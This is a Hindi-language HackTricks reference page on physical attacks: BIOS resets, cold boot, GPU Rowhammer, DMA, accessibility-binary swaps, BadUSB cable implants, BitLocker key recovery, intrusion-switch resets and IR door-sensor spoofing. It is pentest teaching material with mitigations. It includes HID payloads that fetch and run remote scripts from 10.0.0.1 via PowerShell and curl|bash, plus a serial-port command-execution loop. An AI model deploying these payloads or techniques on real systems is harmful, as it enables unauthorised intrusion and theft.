# भौतिक हमले

{{#include ../banners/hacktricks-training.md}}

## BIOS पासवर्ड रिकवरी और सिस्टम सुरक्षा

पुराने PC फर्मवेयर की सेटिंग्स को CMOS बैटरी डिस्कनेक्ट करके या दस्तावेज़ में बताए गए clear-CMOS jumper का उपयोग करके रीसेट किया जा सकता है। बिजली बंद रखने की आवश्यक अवधि बोर्ड पर निर्भर करती है। आधुनिक UEFI पासवर्ड या keys nonvolatile flash, embedded controller या security device में हो सकती हैं, इसलिए बैटरी हटाने के बाद भी बनी रह सकती हैं। Pins को short करने से पहले बोर्ड/सर्विस मैनुअल देखें; इस प्रक्रिया से TPM measurements भी अमान्य हो सकते हैं और disk-encryption recovery शुरू हो सकती है।

पुराने x86 सिस्टम पर **killCMOS** और **CmosPwd** जैसे tools, bootable environment से CMOS में संग्रहीत सेटिंग्स की जाँच या उनमें बदलाव कर सकते हैं। CmosPwd पुराने BIOS परिवारों के दस्तावेज़ीकृत समूह के password formats को पहचानता है और CMOS state का backup, restore या erase/kill कर सकता है; इसके प्रकाशित builds पुराने DOS/Windows, Linux, FreeBSD और NetBSD environments के लिए हैं।<sup>[[18]](#references)</sup> ये utilities सामान्य UEFI password removers नहीं हैं और इनके लिए हार्डवेयर/फर्मवेयर तक पर्याप्त access आवश्यक है।

कुछ laptop firmware कई असफल password attempts के बाद vendor-specific challenge code दिखाते हैं। [bios-pw.org](https://bios-pw.org) जैसे databases कुछ models के लिए पुराने vendor recovery passwords निकाल सकते हैं, लेकिन कई सिस्टम ऐसा lockout लागू करते हैं जिसमें challenge से password नहीं निकाला जा सकता। किसी भी generated password को model-specific मानें और स्थायी attempt counters को पूरी तरह समाप्त करने से बचें।

### UEFI सुरक्षा

आधुनिक **UEFI** सिस्टम के लिए, CHIPSEC Secure Boot variable protections का audit कर सकता है। नीचे दिए गए non-modifying check से शुरुआत करें; वैकल्पिक `-a modify` mode जानबूझकर variables को corrupt करने का प्रयास करता है और इसका उपयोग केवल ऐसे lab system पर किया जाना चाहिए जिसे recover किया जा सके। CHIPSEC स्वयं चेतावनी देता है कि इसका privileged driver और low-level hardware access, production endpoints के लिए उपयुक्त नहीं हैं।<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM विश्लेषण और Cold Boot Attacks

Refresh रुकने पर DRAM तुरंत हर bit नहीं खोता। Decay rate module technology और तापमान के अनुसार काफी बदलती है; ठंडा करने से उपयोगी data बिना ठंडा किए गए power cycle की तुलना में कहीं अधिक समय तक सुरक्षित रह सकता है। Cold-boot attack में तेज़ी से reboot करके एक छोटे acquisition environment में प्रवेश किया जाता है या ठंडे किए गए module को स्थानांतरित किया जाता है, raw memory capture की जाती है, और bit decay के बावजूद cryptographic keys को पुनः प्राप्त किया जाता है। Disk-copy utility अपने-आप physical-memory imager नहीं होती, और Volatility capture का विश्लेषण करता है, उसे acquire नहीं करता; platform के अनुकूल, validated acquisition tool का उपयोग करें।<sup>[[12]](#references)</sup>

---

## Page Tables के विरुद्ध GPU Rowhammer

आधुनिक GPU Rowhammer attacks तब कहीं अधिक उपयोगी हो जाते हैं, जब वे सामान्य buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हाल के काम से पता चलता है कि unprivileged CUDA code चलाने वाला attacker, GPU-विशिष्ट hammering patterns बना सकता है, vulnerable rows में paging structures रखने के लिए **memory massaging** का उपयोग कर सकता है, और फिर **last-level page table** या किसी intermediate **page directory** में bits flip कर सकता है। एक translation entry corrupt होते ही attacker **arbitrary GPU memory read/write** हासिल कर सकता है और फिर host compromise तक पहुँच सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows को profile** करें और in-DRAM mitigations को bypass करने वाले refresh-aware / non-uniform hammering patterns बनाएँ।
2. **GPU allocations को massage** करें ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations में रखे। व्यवहार में, इसका अर्थ low-memory page-table region को भर देना और नियंत्रित strides के साथ बड़े sparse UVM mappings बनाना हो सकता है।
3. Page-table / page-directory entry के भीतर **PFN** या aperture-संबंधित bits जैसे **translation metadata को flip** करें, ताकि attacker-controlled virtual page page-table pages, arbitrary GPU memory या host-visible system mappings पर resolve हो।
4. Forged mapping का दोबारा उपयोग करके अतिरिक्त translation entries को rewrite करें और GPU contexts में **arbitrary GPU memory read/write** तक पहुँचें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU को मनमानी **host physical memory** तक पहुँच दे सकते हैं, जिससे GPU primitive के ज़रिए पूरा host compromise हो सकता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है, क्योंकि एक bit flip बड़े translation subtree को दूसरी जगह निर्देशित कर सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** फिर भी महत्वपूर्ण है, क्योंकि यह GDDRHammer/GeForge द्वारा इस्तेमाल किए जाने वाले सीधे arbitrary-host-memory path को रोकता है, लेकिन यह **पूर्ण mitigation नहीं है**। **GPUBreach** दूसरे चरण का pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver की memory-safety bugs को trigger करके kernel write primitive और **root shell** हासिल करता है, यहाँ तक कि IOMMU enabled होने पर भी।<sup>[[3]](#references)</sup>
- Supported workstation/server GPUs पर **system-level ECC** एक व्यावहारिक hardening कदम है। ECC के बिना consumer GPUs में defense surface कमजोर होता है।<sup>[[4]](#references)</sup>
- ये attacks केवल सैद्धांतिक नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips की सूचना दी, जो host-privilege-escalation की कार्यशील chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

ऐसी offline UEFI IFR/NVRAM patching के लिए, जो pre-boot IOMMU enforcement को downgrade करके Windows DMA chain को सक्षम कर सकती है, देखें:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, FireWire और शुरुआती Thunderbolt configurations जैसे interfaces पर **DMA-आधारित memory acquisition और patching** दिखाता है, जिसमें ऐतिहासिक login-bypass signatures भी शामिल हैं। यह बस “Windows 10 पर अप्रभावी” नहीं है: exploitability interface, target build, IOMMU policy, lock state, और Windows Kernel DMA Protection के supported और enabled होने पर निर्भर करती है। Windows 10 version 1803 और उसके बाद के संस्करणों ने compatible platforms पर Kernel DMA Protection पेश किया, जिससे attack surface में काफी बदलाव आया।<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access के लिए Live CD/USB

Unencrypted या पहले से unlocked Windows volume पर, offline environment **sethc.exe** या **Utilman.exe** जैसी accessibility binaries को **cmd.exe** से बदल सकता है, जिससे संबंधित logon-screen shortcut चलने पर SYSTEM command prompt मिलता है। **chntpw** जैसे tools local SAM account data को edit कर सकते हैं। ये तरीके locked BitLocker volume को bypass नहीं करते और DPAPI/EFS से सुरक्षित credentials को नुकसान पहुँचा सकते हैं; forensic copies और backups सुरक्षित रखें।

**Kon-Boot** supported Windows/macOS configurations के लिए commercial boot-time authentication-bypass tool है। Compatibility OS, firmware mode, Secure Boot और disk-encryption setup पर निर्भर करती है; यह BitLocker-locked volume को decrypt नहीं करता।<sup>[[10]](#references)</sup>

---

## Windows Security Features को संभालना

### Boot और Recovery Shortcuts

- **Delete/Supr**, F2, F10 या किसी अन्य vendor key से firmware setup खुल सकता है।
- **F8** केवल उन configurations में legacy Windows advanced boot options खोलता है जहाँ यह रास्ता अब भी enabled है; मौजूदा recovery entry अलग-अलग हो सकती है।
- **Shift** दबाए रखने से कुछ configurations में Windows automatic logon रुक सकता है, हालाँकि policy/registry settings इस व्यवहार को disable कर सकती हैं।<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** और Teensy boards जैसे devices trusted HID keyboards के रूप में enumerate हो सकते हैं और पहले से निर्धारित keystrokes inject कर सकते हैं। Payload को शुरुआत में logged-on session के privileges और desktop access मिलते हैं; UAC prompts, screen locking, keyboard layout, timing और endpoint USB policy फिर भी उसे सीमित करते हैं।<sup>[[15]](#references)</sup>

Programmable peripherals host kernel parsers पर भी हमला कर सकते हैं और heap grooming तथा information disclosure के लिए कई USB devices के बीच समन्वय कर सकते हैं:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administrator या backup privileges से shadow copy बनाई जा सकती है या registry hives सहेजी जा सकती हैं, ताकि **SAM** और **SYSTEM** जैसी locked files को acquire किया जा सके। यह compromise के बाद की collection technique है, privilege bypass नहीं, और इसे `diskshadow`/VSS तथा registry-hive export events के साथ correlate करना चाहिए।

## BadUSB / HID Implant Techniques

### NFC-triggered Android HID gadget

Rooted Android phone programmable USB keyboard तभी बन सकता है, जब उसके USB controller और kernel में **USB gadget/HID support** हो। Compatible devices पर Kali NetHunter, **USB Arsenal** के ज़रिए gadget profiles उपलब्ध कराता है। एक अन्य विकल्प [USB Gadget Tool](https://github.com/tejado/android-usb-gadget) है, जो ConfigFS gadget functions बनाता है और `/dev/hidg0` तथा `/dev/hidg1` जैसे keyboard/mouse character devices उपलब्ध करा सकता है। यह tool केवल gadget endpoint बनाता है; उसमें HID reports लिखने के लिए अलग process की ज़रूरत होती है। Root access ऐसे kernel की कमी पूरी नहीं कर सकता जिसमें ConfigFS, HID gadget support या उपयोग योग्य USB Device Controller न हो।<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

इस endpoint को physical trigger के रूप में Android NFC के साथ जोड़ा जा सकता है। [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) app tag UID पढ़ता है, उसे अपेक्षित representation में बदलता है, local whitelist जाँचता है, और match मिलने पर configured Rubber Ducky-style keyboard sequence भेजता है। Connected host को सामान्य keyboard input दिखाई देता है और उसे NFC software की ज़रूरत नहीं होती।<sup>[[22]](#references)[[24]](#references)</sup>

Shortcuts या commands इस्तेमाल करने से पहले खाली text editor में enumeration और keyboard layout की पुष्टि करें। एक harmless payload यह है:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

महत्वपूर्ण trust boundaries:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist पहचान है, authentication नहीं**। UID सार्वजनिक होते हैं और कुछ token प्रकार या emulator की मदद से उनकी cloning या impersonation की जा सकती है। कॉपी किया गया allowed UID, मूल token वाले dispatch path का ही अनुसरण करता है।
- **NfcScreenOff** Magisk module, NFC service को इस तरह patch करता है कि वह मानो screen चालू और unlocked हो। अगर फोन पहले से किसी host से जुड़ा है, तो इससे कोई व्यक्ति फोन unlock किए बिना payload trigger कर सकता है।
- Payload में संग्रहीत passwords, API tokens और commands, rooted या bootloader-unlocked device से निकाले जा सकने वाले secrets हैं। HID के ज़रिए password टाइप करना reusable-password automation है, passwordless authentication नहीं।
- HID injection, active desktop के privileges के साथ काम करता है और focus, timing तथा host keyboard layout पर निर्भर करता है। Sensitive actions dispatch करने से पहले हाल की user confirmation ज़रूरी करें, scripts में privileged secrets रखने से बचें, और वास्तविक authentication के लिए cryptographic challenge-response authenticator का इस्तेमाल करें।

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** जैसे ESP32-S3 आधारित implants, USB-A→USB-C या USB-C↔USB-C cables के भीतर छिपे होते हैं, केवल USB keyboard के रूप में enumerate होते हैं, और अपना C2 stack Wi-Fi पर उपलब्ध कराते हैं। Operator को केवल victim host से cable को power देना होता है, `Evil Crow Cable Wind` नाम और `123456789` password वाला hotspot बनाना होता है, और embedded HTTP interface तक पहुँचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसके DHCP address) पर जाना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* और *Config* के लिए tabs होते हैं। Stored payloads को OS के अनुसार tag किया जाता है, keyboard layouts तुरंत बदले जा सकते हैं, और ज्ञात peripherals की नकल करने के लिए VID/PID strings बदली जा सकती हैं।
- चूँकि C2 cable के अंदर होता है, फोन से payloads stage किए जा सकते हैं, execution trigger किया जा सकता है और Wi-Fi credentials प्रबंधित किए जा सकते हैं—इसके लिए संगठन का network इस्तेमाल करने की ज़रूरत नहीं होती। यह कम dwell-time वाली physical intrusions में उपयोगी है।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद चलने के लिए bind करते हैं। Implant हल्की OS fingerprinting करता है और उससे मेल खाने वाली script चुनता है।
- उदाहरण workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`।
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`।
- चूँकि execution बिना निगरानी के होता है, केवल charging cable बदलने से logged-on user के context में “plug-and-pwn” initial access मिल सकता है।

### Wi-Fi TCP पर HID-bootstrapped remote shell

1. **Keystroke bootstrap:** Stored payload एक console खोलता है और ऐसा loop paste करता है जो नए USB serial device पर आने वाली हर चीज़ execute करता है। Windows का एक न्यूनतम variant है:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant USB CDC channel को खुला रखता है, जबकि इसका ESP32-S3 ऑपरेटर को वापस TCP client (Python script, Android APK, या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए किसी भी byte को ऊपर दिए गए serial loop में forward किया जाता है, जिससे air-gapped hosts पर भी remote command execution संभव होता है। Output सीमित होता है, इसलिए ऑपरेटर आमतौर पर blind commands (account creation, अतिरिक्त tooling को stage करना आदि) चलाते हैं।

### HTTP OTA update surface

- दस्तावेज़ीकृत Evil Crow Cable Wind interface `/update` पर unauthenticated firmware-update endpoint उपलब्ध कराता है:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators engagement के बीच में cable खोले बिना features को hot-swap कर सकते हैं (जैसे, flash USB Army Knife firmware), जिससे implant target host से जुड़ा रहते हुए नई capabilities पर pivot कर सकता है।

## BitLocker Encryption को Bypass करना

किसी चालू या हाल ही में चलाए गए system का अधिकृत forensic acquisition करते समय, volume अनलॉक होने पर उसमें BitLocker volume master key या उससे संबंधित key material हो सकता है। Elcomsoft Forensic Disk Decryptor और Passware Kit Forensic जैसे commercial tools समर्थित memory images, hibernation files या crash dumps में खोज कर सकते हैं, लेकिन सफलता की गारंटी नहीं है। BitLocker सक्षम होने पर आधुनिक Windows crash dumps को भी encrypt करता है, और संग्रहीत 48-digit recovery password, memory में मौजूद volume key से अलग artifact है।<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key जोड़ने के लिए Social Engineering

जो attacker किसी administrator को BitLocker-management commands चलाने के लिए मना लेता है, वह recovery-password, external-key या कोई अन्य protector जोड़कर उसे capture कर सकता है। Recovery password मनमाना शून्य वाला string नहीं हो सकता: BitLocker numerical recovery passwords का format मान्य 48-digit होना चाहिए। अधिकृत प्रशासन के लिए संबंधित syntax है `manage-bde -protectors -add C: -recoverypassword`; जोड़े गए protectors देखने के लिए `manage-bde -protectors -get C:` चलाएँ। Protector जोड़ने की निगरानी करें और सुनिश्चित करें कि नई recovery material केवल अनुमोदित स्थानों पर escrow की जाए।<sup>[[16]](#references)</sup>

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई आधुनिक laptops और छोटे form-factor desktops में **chassis-intrusion switch** होता है, जिसकी निगरानी Embedded Controller (EC) और BIOS/UEFI firmware करता है। हालांकि इस switch का मुख्य उद्देश्य device खोले जाने पर alert देना है, लेकिन कभी-कभी vendors एक **undocumented recovery shortcut** लागू करते हैं, जो switch को एक खास pattern में toggle करने पर trigger होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch को EC पर **GPIO interrupt** से जोड़ा जाता है।
2. EC पर चलने वाला firmware **presses के timing और संख्या** का हिसाब रखता है।
3. जब hard-coded pattern पहचाना जाता है, तो EC एक *mainboard-reset* routine चलाता है, जो **system NVRAM/CMOS की सामग्री मिटा देता है**।
4. अगले boot पर, प्रभावित models firmware की reset state लोड करते हैं। Vendor और revision के आधार पर, मिटाई गई state में supervisor password, custom boot settings या enrolled Secure Boot keys शामिल हो सकती हैं; TPM state और disk-encryption पर प्रभाव का अलग से आकलन करना चाहिए।

> Firmware reset से external-boot options बहाल हो सकते हैं, लेकिन इससे storage decrypt **नहीं** होती। BitLocker या कोई अन्य full-disk encryption system, TPM/firmware में बदलाव के बाद recovery mode में जा सकता है और recovery key के बिना भी internal drive को सुरक्षित रख सकता है।<sup>[[16]](#references)</sup>

### वास्तविक उदाहरण – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) का recovery shortcut यह है:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

दसवें चक्र के बाद EC एक फ्लैग सेट करता है, जो BIOS को अगले रीबूट पर NVRAM मिटाने का निर्देश देता है। पूरी प्रक्रिया में लगभग 40 सेकंड लगते हैं और इसके लिए **सिर्फ़ एक स्क्रूड्राइवर** चाहिए।<sup>[[5]](#references)</sup>

### सामान्य Exploitation प्रक्रिया

1. लक्ष्य को चालू करें या उसे सस्पेंड से फिर शुरू करें, ताकि EC चल रहा हो।
2. नीचे का कवर हटाकर intrusion/maintenance switch तक पहुँचें।
3. विक्रेता-विशिष्ट toggle pattern दोहराएँ (दस्तावेज़, फ़ोरम देखें या EC firmware को reverse-engineer करें)।
4. डिवाइस फिर से जोड़ें और रीबूट करें, फिर जाँचें कि firmware की कौन-सी सेटिंग और credentials वास्तव में बदले।
5. यदि अधिकृत हो और external boot उपलब्ध हो, तो नियंत्रित live image से बूट करें। किसी internal volume के वैध रूप से अनलॉक हो जाने पर (या यदि वह कभी encrypted नहीं था), live environment credentials और data हासिल कर सकता है या EFI System Partition की जाँच कर सकता है। EFI implant इंस्टॉल करने के लिए उस partition में बदलाव करना स्थायी और अत्यधिक दखल देने वाला है, और Secure Boot, measured boot, firmware write protection तथा endpoint monitoring से सीमित रहता है। Encrypted storage उसकी key या recovery material के बिना पहुँच से बाहर रहता है।

### Detection और Mitigation

* OS management console में chassis-intrusion घटनाओं को लॉग करें और उन्हें अप्रत्याशित BIOS resets से जोड़कर देखें।
* खुलने का पता लगाने के लिए स्क्रू/कवर पर **छेड़छाड़-स्पष्ट seals** लगाएँ।
* डिवाइस **भौतिक रूप से नियंत्रित जगहों** पर रखें; मानकर चलें कि physical access का मतलब पूर्ण compromise है।
* जहाँ उपलब्ध हो, विक्रेता का “maintenance switch reset” फीचर बंद करें या NVRAM reset के लिए अतिरिक्त cryptographic authorisation अनिवार्य करें।

---

## No-Touch Exit Sensors के विरुद्ध Covert IR Injection

### Sensor की विशेषताएँ
- आम “wave-to-exit” sensors में near-IR LED emitter और TV-remote जैसे receiver module का जोड़ा होता है। Receiver सही carrier (लगभग 30 kHz) के कई pulses (लगभग 4–10) देखने के बाद ही logic high रिपोर्ट करता है।<sup>[[7]](#references)</sup>
- एक plastic shroud emitter और receiver को सीधे एक-दूसरे की ओर देखने से रोकता है, इसलिए controller मानता है कि किसी भी मान्य carrier का स्रोत पास से हुआ reflection है और door strike खोलने के लिए relay सक्रिय करता है।
- Controller को लक्ष्य मौजूद होने का विश्वास हो जाने पर वह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver filtered carrier से मेल खाने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack Workflow
1. **Emission profile कैप्चर करें** – controller pins पर logic analyser लगाकर internal IR LED को चलाने वाले pre-detection और post-detection, दोनों waveforms रिकॉर्ड करें।
2. **सिर्फ़ “post-detection” waveform दोबारा चलाएँ** – stock emitter को हटाएँ/नज़रअंदाज़ करें और शुरुआत से ही पहले से ट्रिगर किया गया pattern किसी external IR LED से चलाएँ। चूँकि receiver को केवल pulse count/frequency से मतलब है, वह spoofed carrier को असली reflection मानता है और relay line सक्रिय कर देता है।
3. **Transmission को नियंत्रित करें** – carrier को समायोजित bursts में भेजें (जैसे, दसियों milliseconds चालू और लगभग उतनी ही देर बंद), ताकि receiver का AGC या interference-handling logic संतृप्त किए बिना न्यूनतम pulse count भेजा जा सके। लगातार emission से sensor जल्दी असंवेदनशील हो जाता है और relay सक्रिय होना बंद कर देता है।

### लंबी दूरी से Reflective Injection
- Bench LED की जगह high-power IR diode, MOSFET driver और focusing optics लगाने से लगभग 6 m दूर से भरोसेमंद triggering संभव होता है।
- हमलावर को receiver aperture के साथ line-of-sight की ज़रूरत नहीं होती; beam को ऐसी अंदरूनी दीवारों, shelving या door frames पर निशाना बनाना, जो काँच के पार दिखाई देते हों, reflected energy को लगभग 30° के field of view में प्रवेश करने देता है और पास से हाथ हिलाने जैसा प्रभाव पैदा करता है।
- चूँकि receivers केवल कमज़ोर reflections की अपेक्षा करते हैं, इसलिए कहीं अधिक शक्तिशाली external beam कई सतहों से टकराने के बाद भी detection threshold से ऊपर रह सकती है।

### Weaponised Attack Torch
- Driver को commercial flashlight के अंदर लगाने से tool सामान्य नज़र आता है। दिखाई देने वाली LED की जगह receiver के band से मेल खाने वाली high-power IR LED लगाएँ, लगभग 30 kHz bursts बनाने के लिए ATtiny412 (या ऐसा ही कोई अन्य component) जोड़ें और LED current को sink करने के लिए MOSFET इस्तेमाल करें।
- Telescopic zoom lens beam को अधिक दूरी/सटीकता के लिए संकरा करता है, जबकि MCU के नियंत्रण में vibration motor, दिखाई देने वाली रोशनी निकाले बिना modulation सक्रिय होने की haptic पुष्टि देता है।
- कई संग्रहीत modulation patterns (थोड़ी अलग carrier frequencies और envelopes) के बीच अदल-बदल करने से rebranded sensor families के साथ compatibility बढ़ती है। इससे operator reflective surfaces को तब तक जाँच सकता है, जब तक relay की क्लिक सुनाई न दे और दरवाज़ा खुल न जाए।

---

## References

- [1] [GDDRHammer: DRAM पंक्तियों को व्यापक रूप से बाधित करना — आधुनिक GPUs से Cross-Component Rowhammer Attacks](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: मौज-मस्ती और फ़ायदे के लिए GPU Page Tables बनाने हेतु GDDR Memory को Hammer करना](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer का उपयोग करके GPUs पर Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - जुलाई 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. यहाँ दबाकर pwn करें”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch से IR No-Touch Exit Sensors को Bypass करना”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind से Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips के विरुद्ध Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot का आधिकारिक documentation और compatibility की जानकारी](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [जब तक हम याद रखें: Encryption Keys पर Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA के माध्यम से physical memory में बदलाव](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker संचालन मार्गदर्शिका](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift दबाए रखने और automatic logon के व्यवहार के बारे में](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation और downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Root किए गए Android Phone को अपने PC के लिए NFC Authenticator और Automation Tool में बदलें](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
